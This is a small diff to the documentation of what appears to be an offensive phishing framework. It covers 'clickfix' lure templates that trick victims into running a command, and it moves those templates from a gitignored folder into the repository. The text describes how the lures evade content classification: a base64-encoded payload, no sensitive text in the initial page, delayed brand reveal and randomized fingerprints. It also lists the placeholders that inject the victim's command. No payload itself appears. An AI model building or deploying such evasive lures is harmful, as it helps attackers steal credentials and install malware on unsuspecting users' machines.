@@ -94,8 +94,8 @@ clickfix:
   position: before                   # before = pre-login, after = post-capture
 ```
 
-Templates in `clickfix/templates/` (gitignored, deployed to the node like
-phishlets). Hardened against content classification: zero sensitive text
+Templates in `src/clickfix/templates/` (shipped in the repo; the node reads
+them from disk per request). Hardened against content classification: zero sensitive text
 in the initial DOM, base64 payload, brand lazy-reveal, randomized
 fingerprint. Placeholders: `{command_b64}` (preferred), `{command}`
 (legacy), `{redirect_url}` (auto-substituted).
